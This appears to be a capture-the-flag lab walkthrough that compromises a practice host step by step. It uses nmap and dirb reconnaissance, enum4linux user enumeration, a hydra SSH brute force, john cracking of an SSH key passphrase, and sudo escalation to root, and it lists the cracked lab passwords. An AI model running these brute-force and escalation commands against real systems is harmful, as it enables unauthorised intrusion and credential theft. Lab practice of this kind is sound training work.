#### 1. Let's use nmap to get some info about our target

```
nmap -A 1.2.3.4
```

* We see that ssh is running, maybe we can target that.


&nbsp;

#### 2. Let's also get dirb running to find some folders on the webapp

```
dirb http://1.2.3.4
```

* Here we find the that hidden directory's name is "development"

&nbsp;

#### 3. Since we know ssh is running, lets try enumerating users and other info

```
enum4linux -a 1.2.3.4
```

* we find 2 users, jan and kay

&nbsp;

#### 4. Now that we have some users, lets try to brute force their ssh credentials

```
hydra -l jan -P rockyou.txt ssh://1.2.3.4
```

* jan password = armando

&nbsp;

#### 5. We find kay's ssh private key and download for cracking with john

```
python ssh2john.py id_rsa > id_rsa.forjohn
john --wordlist=rockyou.txt id_rsa.forjohn
```

* kay's private key password = beeswax

&nbsp;

#### 6. After we ssh in as kay, we can simply display the backup password

```
cat pass.bak
```

* kay password = heresareallystrongpasswordthatfollowsthepasswordpolicy$$

&nbsp;

#### Bonus! They did not lock down root so we can sudo ourselves up

```
sudo su
ls /root
```

* We see the final flag, and the mission is complete.
